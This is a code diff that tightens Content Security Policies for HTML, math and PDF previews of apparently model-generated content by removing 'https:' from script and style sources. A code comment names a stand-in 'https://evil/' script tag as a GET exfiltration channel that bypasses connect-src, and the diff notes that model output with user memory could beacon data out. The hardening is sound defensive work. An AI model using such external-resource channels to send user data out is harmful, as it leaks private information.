@@ -5,11 +5,11 @@
  * app tokens (baseUrl https://localhost/, no cookies), but without a CSP the JS
  * could still make arbitrary network egress. This policy locks down the document:
  *  - default-src 'none': deny everything by default
- *  - script-src 'unsafe-inline' https: / style-src 'unsafe-inline' https: inline
- *    code runs (the preview's purpose); https external scripts/styles load
+ *  - script-src / style-src 'unsafe-inline' only — inline code runs (the
+ *    preview's purpose). NO https:: a <script src="https://evil/?…"> is a
+ *    working GET exfil channel that bypasses connect-src 'none'.
  *  - img/font/media: data/blob only — NO https:. An <img src="https://…"> (or
- *    font/media URL) is a working GET exfil channel that bypasses connect-src
- *    'none'; model HTML with user memory in context must not beacon out.
+ *    font/media URL) is the same passive GET exfil class.
  *  - connect-src 'none': JS cannot fetch/XHR/WebSocket anywhere (no exfiltration)
  *  - base-uri 'none' / form-action 'none': no <base> hijack, no form submits
  *
@@ -22,8 +22,8 @@
  */
 export const PREVIEW_CSP = [
   "default-src 'none'",
-  "style-src 'unsafe-inline' https:",
-  "script-src 'unsafe-inline' https:",
+  "style-src 'unsafe-inline'",
+  "script-src 'unsafe-inline'",
   "img-src data: blob:",
   "font-src data:",
   "media-src data: blob:",
@@ -48,8 +48,8 @@ export const PREVIEW_CSP = [
  */
 export const MATH_PREVIEW_CSP = [
   "default-src 'none'",
-  "style-src 'unsafe-inline' https:",
-  "script-src 'unsafe-inline' https:",
+  "style-src 'unsafe-inline'",
+  "script-src 'unsafe-inline'",
   "img-src data: blob: https:",
   "font-src data: https:",
   "media-src data: blob: https:",
@@ -71,8 +71,8 @@ export const MATH_PREVIEW_CSP = [
  */
 export const PDF_PREVIEW_CSP = [
   "default-src 'none'",
-  "style-src 'unsafe-inline' https:",
-  "script-src 'unsafe-inline' https:",
+  "style-src 'unsafe-inline'",
+  "script-src 'unsafe-inline'",
   "worker-src blob:",
   "img-src data: blob: https:",
   "font-src data: https:",
